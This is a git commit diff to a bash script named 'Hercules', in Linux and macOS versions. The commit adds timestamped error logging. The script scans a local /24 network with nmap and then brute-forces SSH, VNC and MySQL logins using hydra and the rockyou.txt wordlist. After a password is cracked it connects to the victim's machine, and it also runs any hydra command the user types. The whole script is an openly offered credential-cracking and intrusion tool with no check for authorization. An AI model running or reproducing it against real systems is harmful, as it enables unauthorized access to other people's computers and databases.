d401691f389bf25a6649556a9afa791671896e04
Will Segale <39059459+WilSegale@users.noreply.github.com>
2023-05-16 20:16:04 -0400

    log

--- linux/.script.sh
+++ linux/.script.sh
@@ -1,10 +1,18 @@
 #!/bin/bash
 root = 0
+# gets the current time in a 12 hour formate
+CURRENT_TIME=$(date +"%I:%M:%S %p")
+
+# gets current date in mm/dd/yyyy formate
+CURRENT_DATE=$(date +"%m/%d/%Y")
+
 if [[ "$OSTYPE" == "linux"* ]]; then   
     clear; #clears the terminal
     if [[ "$EUID" -ne $root  ]]; then #makes the user run this script in root user
-        echo "Please run as root." #if the user isnt root it says "run as root"
-        exit; #stops the program so it does not contiue when its not suppoes to
+        #if the user isnt root it says "run as root"
+        echo "ERROR:TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE" >> ERROR.LOG
+        echo "TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE"
+        exit; #stops the program so it does not contiue when its not suppoes to 
     else
         chmod +x * #this makes all files about to be used with "./"
         sudo rm -rf hydra.restore #gets rid of the hydra.restore file
@@ -15,7 +23,9 @@ if [[ "$OSTYPE" == "linux"* ]]; then
             echo #this is a space in the program
 
         else #if they are not connected to the internet it will say "You are offline please connect to the internet"
-            echo "You are offline please connect to the internet."
+            echo "ERROR:TIME:$CURRENT_TIME You are offline please connect to the internet. DATE:$CURRENT_DATE" >> ERROR.LOG
+            echo "TIME:$CURRENT_TIME You are offline please connect to the internet. DATE:$CURRENT_DATE"
+
             exit #stops the program so it doesnt contiue when its not suppoes to
         fi
 
@@ -27,7 +37,8 @@ if [[ "$OSTYPE" == "linux"* ]]; then
             echo "Type your own number to see what port you want to see"
             read -p "Do you want SSH(22), VNC(5900), MySQL(3306). To see all type (ALL): " service #what the user can choice to see what port is open to crack
         
-        if [[ $service == "ALL" ]] || [[ $service == "all" ]]; then #if the user says all if scan the intier network to see whats open
+        if [[ $service == "ALL" ]] || 
+           [[ $service == "all" ]]; then #if the user says all if scan the intier network to see whats open
             sudo nmap -sS 192.168.1.1/24 --open;   #this also allowes them to crack what port is open if they want too
             hydra -h; #helps the user use hydra by showing what it can do
             echo "Put in hydra first to start the script."; #tells the user to put Hydra first so that the program will work
@@ -45,7 +56,7 @@ if [[ "$OSTYPE" == "linux"* ]]; then
             read -p "Input Hostname: " host #allows the user to intpu the hostname for the cracking softwhere to work
 
             if [[ $service == 5900 ]] || [[ $service == "VNC" ]]; then #makes the user input "NONE" for them to crack prot 5900(VNC)
-                hydra -P rockyou.txt -t 64 -vV -o output.txt -I vnc://$host #Cracks the chocien persons password for 5900(VNC)
+                hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host #Cracks the chocien persons password for 5900(VNC)
                 echo "Loading VNC server." #tells the user that VNC(5900) is loading
                 sleep 1 # wait function 
                 echo "Loading VNC server.." #tells the user that VNC(5900) is loading
@@ -56,7 +67,7 @@ if [[ "$OSTYPE" == "linux"* ]]; then
                 exit; # stops the porgram
 
             elif [[ $service == 22 ]] || [[ $service == "ssh" ]]; then
-                hydra -l $user -P rockyou.txt -t 64 -vV -o output.txt -I ssh://$host #Cracks the chocien persons password for 22(SSH)
+                hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host #Cracks the chocien persons password for 22(SSH)
                 echo #this is a space in the program
                 echo "Connecting to $user@$host" #tell's the user that the software is trying to connecto to the-
                                                  #username and the hostname of the person that they hacked into
@@ -64,7 +75,7 @@ if [[ "$OSTYPE" == "linux"* ]]; then
                 ssh $user@$host #this connects to the users computer by 22 (SSH[Secure Shell])
             
             elif [[ $service == 3306 ]] || [[ $service == "mysql" ]]; then 
-                hydra -l $user -P rockyou.txt -t 64 -vV -o output.txt -I mysql://$host #Cracks the chocien persons password for 3306(MySQL)
+                hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host #Cracks the chocien persons password for 3306(MySQL)
                 echo "Loading to MySQL server..."
                 sleep 3;
                 mysql -u $user -p -A #connects to the MySQL server
@@ -73,6 +84,7 @@ if [[ "$OSTYPE" == "linux"* ]]; then
         fi
         Hercules; #end of the function of Hercules
 else
-    clear;
-    echo "Wrong OS please use the correct OS." #if the users is not useing the right OS it says "You are useing the wrong OS"
+    clear; #clears the terminal
+    echo "WARNING:TIME:$CURRENT_TIME Wrong OS please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG #if the users is not useing the right OS it says "You are useing the wrong OS" and puts it into a error log for the user to see what went wrong with the code
+    echo "TIME:$CURRENT_TIME Wrong OS please use the correct OS. DATE:$CURRENT_DATE" #if the users is not useing the right OS it says "You are useing the wrong OS"
 fi
--- mac/.script.sh
+++ mac/.script.sh
@@ -1,10 +1,18 @@
 #!/bin/bash
 root = 0
+# gets the current time in a 12 hour formate
+CURRENT_TIME=$(date +"%I:%M:%S %p")
+
+# gets current date in mm/dd/yyyy formate
+CURRENT_DATE=$(date +"%m/%d/%Y")
+
 if [[ "$OSTYPE" == "darwin"* ]]; then   
     clear; #clears the terminal
     if [[ "$EUID" -ne $root  ]]; then #makes the user run this script in root user
-        echo "Please run as root." #if the user isnt root it says "run as root"
-        exit; #stops the program so it does not contiue when its not suppoes to
+        #if the user isnt root it says "run as root"
+        echo "ERROR:TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE" >> ERROR.LOG
+        echo "TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE"
+        exit; #stops the program so it does not contiue when its not suppoes to 
     else
         chmod +x * #this makes all files about to be used with "./"
         sudo rm -rf hydra.restore #gets rid of the hydra.restore file
@@ -15,7 +23,9 @@ if [[ "$OSTYPE" == "darwin"* ]]; then
             echo #this is a space in the program
 
         else #if they are not connected to the internet it will say "You are offline please connect to the internet"
-            echo "You are offline please connect to the internet."
+            echo "ERROR:TIME:$CURRENT_TIME You are offline please connect to the internet. DATE:$CURRENT_DATE" >> ERROR.LOG
+            echo "TIME:$CURRENT_TIME You are offline please connect to the internet. DATE:$CURRENT_DATE"
+
             exit #stops the program so it doesnt contiue when its not suppoes to
         fi
 
@@ -23,17 +33,19 @@ if [[ "$OSTYPE" == "darwin"* ]]; then
 
         function Hercules() { #start of the hacking software
 
-            figlet -f slant "Hercules"            
+            figlet -f slant "Hercules"
             echo "Type your own number to see what port you want to see"
             read -p "Do you want SSH(22), VNC(5900), MySQL(3306). To see all type (ALL): " service #what the user can choice to see what port is open to crack
-
-        if [[ $service == "ALL" ]] || [[ $service == "all" ]]; then #if the user says all if scan the intier network to see whats open
+        
+        if [[ $service == "ALL" ]] || 
+           [[ $service == "all" ]]; then #if the user says all if scan the intier network to see whats open
             sudo nmap -sS 192.168.1.1/24 --open;   #this also allowes them to crack what port is open if they want too
             hydra -h; #helps the user use hydra by showing what it can do
             echo "Put in hydra first to start the script."; #tells the user to put Hydra first so that the program will work
             read -p ">>> " Hydra; #allows the user to hack diffrent ports that werent there before
             $Hydra;
             exit;
+            
         else  #this part says for them only to see what prots are open
             sudo nmap -sS 192.168.1.1/24 -p $service --open
             
@@ -45,11 +57,16 @@ if [[ "$OSTYPE" == "darwin"* ]]; then
 
             if [[ $service == 5900 ]] || [[ $service == "VNC" ]]; then #makes the user input "NONE" for them to crack prot 5900(VNC)
                 hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host #Cracks the chocien persons password for 5900(VNC)
+                echo "Loading VNC server." #tells the user that VNC(5900) is loading
+                sleep 1 # wait function 
+                echo "Loading VNC server.." #tells the user that VNC(5900) is loading
+                sleep 1 # wait function 
                 echo "Loading VNC server..." #tells the user that VNC(5900) is loading
+                sleep 1 # wait function 
                 open vnc://$host #allows the user to remotly connect to the users Desktop to play with there desktop
                 exit; # stops the porgram
 
-            elif [[ $service == 22 ]] || [[ $service == "ssh" ]] || [[ $service == "SSH" ]]; then
+            elif [[ $service == 22 ]] || [[ $service == "ssh" ]]; then
                 hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host #Cracks the chocien persons password for 22(SSH)
                 echo #this is a space in the program
                 echo "Connecting to $user@$host" #tell's the user that the software is trying to connecto to the-
@@ -57,10 +74,10 @@ if [[ "$OSTYPE" == "darwin"* ]]; then
                 sleep 3
                 ssh $user@$host #this connects to the users computer by 22 (SSH[Secure Shell])
             
-            elif [[ $service == 3306 ]] || [[ $service == "mysql" ]] || [[ $service == "MySQL" ]]; then 
+            elif [[ $service == 3306 ]] || [[ $service == "mysql" ]]; then 
                 hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host #Cracks the chocien persons password for 3306(MySQL)
-                echo "Loading to MySQL server..." # tells the user that MySQL is Loading 
-                sleep 3; #makes the program wait for 3 seconds
+                echo "Loading to MySQL server..."
+                sleep 3;
                 mysql -u $user -p -A #connects to the MySQL server
             fi
         }
@@ -68,5 +85,6 @@ if [[ "$OSTYPE" == "darwin"* ]]; then
         Hercules; #end of the function of Hercules
 else
     clear; #clears the terminal
-    echo "Wrong OS please use the correct OS." #if the users is not useing the right OS it says "You are useing the wrong OS"
+    echo "WARNING:TIME:$CURRENT_TIME Wrong OS please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG #if the users is not useing the right OS it says "You are useing the wrong OS" and puts it into a error log for the user to see what went wrong with the code
+    echo "TIME:$CURRENT_TIME Wrong OS please use the correct OS. DATE:$CURRENT_DATE" #if the users is not useing the right OS it says "You are useing the wrong OS"
 fi
